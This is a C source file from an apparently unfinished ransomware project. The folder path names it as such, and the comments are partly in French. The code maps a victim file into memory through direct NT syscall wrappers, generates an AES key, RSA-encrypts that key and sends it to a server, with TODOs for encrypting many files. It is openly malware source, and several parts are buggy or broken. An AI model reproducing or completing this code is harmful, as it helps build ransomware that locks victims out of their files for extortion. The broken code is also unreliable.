#include "core/encrypter.h"
#include "core/my_aes.h"
#include "utils/rng.h"

int loadFileInMemory(HANDLE fileHandle, HANDLE sectionHandle, PVOID localSectionAddress, ULONG size, PCWSTR filePath)
{
    fileHandle = NULL;
    sectionHandle = NULL;
    localSectionAddress = NULL;

    OBJECT_ATTRIBUTES oa;
    NTSTATUS status = 0;
    UNICODE_STRING fileName;
    IO_STATUS_BLOCK osb;

    RtlInitUnicodeString(&fileName, filePath);
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    // TODO : Se renseigner sur le caching de la mémoire
    // Avec notamment ces flags qui peuvent éviter le cache FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
    status = SysNtCreateFile(
        &fileHandle,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        &oa,
        &osb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (status != 0)
    {
        printf("Error opening file: 0x%X\n", status);
        return 1;
    }

    // Create a section for the file
    // The section is a memory-mapped file
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 0x100000; // 1MB

    status = SysNtCreateSection(
        &sectionHandle,
        SECTION_MAP_READ | SECTION_MAP_WRITE,
        NULL,
        (PLARGE_INTEGER)&sectionSize,
        PAGE_READWRITE,
        SEC_COMMIT,
        fileHandle);

    if (NT_SUCCESS(status))
    {
        printf("Section created successfully\n");
    }
    else
    {
        printf("Error creating the section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    if (size < 0x10000)
    {
        printf("Size is smaller than 0x10000\n");
    }

    ULONG zeroBits = 10; // Permet de forcer le système a mapper la vue dans une adresse basse de la mémoire virtuelle /!\ sur ma mahcine, au dessus de 11 ça ne fonctionne plus
    status = SysNtMapViewOfSection(
        sectionHandle,
        GetCurrentProcess(),
        &localSectionAddress,
        zeroBits,
        0,
        NULL,
        &size,
        ViewShare,
        0,
        PAGE_READWRITE);

    // Check if the mapping was successful
    if (NT_SUCCESS(status))
    {
        printf("Section mapped successfully at address: %p\n", localSectionAddress);
    }
    else
    {
        printf("Error mapping section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }
    if (localSectionAddress == NULL)
    {
        printf("Error local address section is NULL : %d\n", GetLastError());
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }
}

int key_handler(state_t key)
{

    // Send the key to the server
    char buff[257] = {'X'}; // 256 bytes + 1 for the null terminator

    uint8_t key_elongate[16] = {0}; // 16 bytes
    // Convert the key to a char array of size 16 bytes
    for (int i = 0; i < 16; i++)
    {
        // Convert to char
        key_elongate[i] = key[i / 4][i % 4];
    }

    // Encrypt the message using RSA
    rsa(key_elongate, buff);
    int i = 0;
    printf("Encrypted Key:\n'");
    while (buff[i] != 0)
    {
        printf("%c", buff[i]);
        i += 1;
    }
    printf("'\n");
    printf("Encrypted Key length: %d\n", i);

    // Send the key to the server (16 bytes)
    if (SendKey(buff) == 0)
    {
        return 0;
    }
    else
    {
        printf("Send failed\n");
        return 1;
    }
}

int main()
{
    HANDLE fileHandle = NULL;
    HANDLE sectionHandle = NULL;
    PVOID localSectionAddress = NULL;
    ULONG size = 0x10000; // 65536 bytes (64KB)
    PCWSTR filePath = (PCWSTR)L"\\??\\C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test\\monfichier.txt";

    loadFileInMemory(fileHandle, sectionHandle, localSectionAddress, size, filePath);

    generateRandomSeed(); // Initialize the random seed
    // Generate a random key of 128 bits (16 bytes)
    state_t key;
    generateRandomKey(key);
    state_t keys[10] = {{{0}}}; // Initialize all keys to zero (the base_key is added in the function)
    // Generate the keys (can't be more than 10 keys because of the Rcon table)
    GenerateTenKeys(key, keys);

    char filePart[16];

    for (int i = 0; i < 16; i++)
    {
        filePart[i] = (char *)localSectionAddress[i];
    }
    

    aes(keys, "23456789ABCDEF0109546789CBA3EF10");

    //Chiffrer plusieurs fichiers

    //Envoyer la clé 

    // Free the section handle
    //  This will unmap the section from the process's address space
    //  and close the handle to the section object
    // syscall : NtUnmapViewOfSection(GetCurrentProcess(), localSectionAddress);
    UnmapViewOfFile(localSectionAddress); // Unmap using the API (no need to call syscall directly)
    CloseHandle(sectionHandle);
    // Close the file handle
    CloseHandle(fileHandle);

    return 0;
}
